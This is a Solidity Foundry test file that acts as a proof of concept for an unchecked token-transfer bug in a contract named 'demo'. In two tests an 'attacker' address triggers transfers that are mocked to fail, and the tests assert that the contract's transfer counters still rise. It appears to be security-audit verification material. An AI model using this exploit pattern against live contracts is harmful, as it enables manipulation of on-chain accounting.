// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol";

contract DemoTest is Test {
    demo public token;
    address feeCollector = address(0x1);
    address tokenContract = address(0x2);
    address attacker = address(0x3);
    address[] recipients;

    function setUp() public {
        vm.prank(feeCollector);
        token = new demo();
        
        // Setup recipients array
        recipients.push(address(0x4));
        recipients.push(address(0x5));
    }

    // Mock token contract that will fail all transfers
    function testUncheckedTransferFailure() public {
        // Mock token contract that always fails transfers
        vm.mockCall(
            tokenContract,
            abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)"))),
            abi.encode(false)
        );

        // Pre-attack state snapshot
        uint256 preTotalTransfers = token.totalTransfers(recipients[0]);
        uint256 preUserTransfers = token.userTransfers(attacker, recipients[0]);
        
        console.log("--- BEFORE-Trigger Data ---");
        console.log("Pre-attack totalTransfers:", preTotalTransfers);
        console.log("Pre-attack userTransfers:", preUserTransfers);
        
        console.log("--- Trigger FailedTransfer ---");
        // Attempt transfer that will fail
        vm.prank(attacker);
        token.transfer(attacker, tokenContract, recipients, 100 ether);

        // Post-attack state snapshot
        uint256 postTotalTransfers = token.totalTransfers(recipients[0]);
        uint256 postUserTransfers = token.userTransfers(attacker, recipients[0]);
        
        console.log("--- AFTER-Trigger Data ---");
        console.log("Post-attack totalTransfers:", postTotalTransfers);
        console.log("Post-attack userTransfers:", postUserTransfers);

        // Check vulnerability exploitation
        bool stateIncreased = (postTotalTransfers > preTotalTransfers) && 
                             (postUserTransfers > preUserTransfers);
        
        if (stateIncreased) {
            console.log("VULNERABILITY VERDICT: Vulnerability Exists - State increased despite transfer failure");
        } else {
            console.log("VULNERABILITY VERDICT: Vulnerability not Exist - State remained unchanged");
        }

        // Final assertion
        assertTrue(stateIncreased, "Vulnerability exists: State manipulation confirmed");
    }

    function testPartialTransferFailure() public {
        // Mock token contract that fails only fee transfers
        vm.mockCall(
            tokenContract,
            abi.encodeWithSelector(
                bytes4(keccak256("transferFrom(address,address,uint256)")),
                attacker,
                recipients[0],
                90 ether // transferAmount = 100 - 10% fee
            ),
            abi.encode(true)
        );
        
        vm.mockCall(
            tokenContract,
            abi.encodeWithSelector(
                bytes4(keccak256("transferFrom(address,address,uint256)")),
                attacker,
                feeCollector,
                10 ether // fee amount
            ),
            abi.encode(false)
        );

        // Pre-attack state snapshot
        uint256 preTotalTransfers = token.totalTransfers(recipients[0]);
        uint256 preUserTransfers = token.userTransfers(attacker, recipients[0]);
        
        console.log("--- BEFORE-Trigger Data ---");
        console.log("Pre-attack totalTransfers:", preTotalTransfers);
        console.log("Pre-attack userTransfers:", preUserTransfers);
        
        console.log("--- Trigger PartialTransfer ---");
        // Attempt transfer where main transfer succeeds but fee fails
        vm.prank(attacker);
        token.transfer(attacker, tokenContract, recipients, 100 ether);

        // Post-attack state snapshot
        uint256 postTotalTransfers = token.totalTransfers(recipients[0]);
        uint256 postUserTransfers = token.userTransfers(attacker, recipients[0]);
        
        console.log("--- AFTER-Trigger Data ---");
        console.log("Post-attack totalTransfers:", postTotalTransfers);
        console.log("Post-attack userTransfers:", postUserTransfers);

        // Check vulnerability exploitation
        bool stateIncreased = (postTotalTransfers > preTotalTransfers) && 
                             (postUserTransfers > preUserTransfers);
        
        if (stateIncreased) {
            console.log("VULNERABILITY VERDICT: Vulnerability Exists - State increased despite fee failure");
        } else {
            console.log("VULNERABILITY VERDICT: Vulnerability not Exist - State remained unchanged");
        }

        // Final assertion
        assertTrue(stateIncreased, "Vulnerability exists: State manipulation confirmed");
    }
}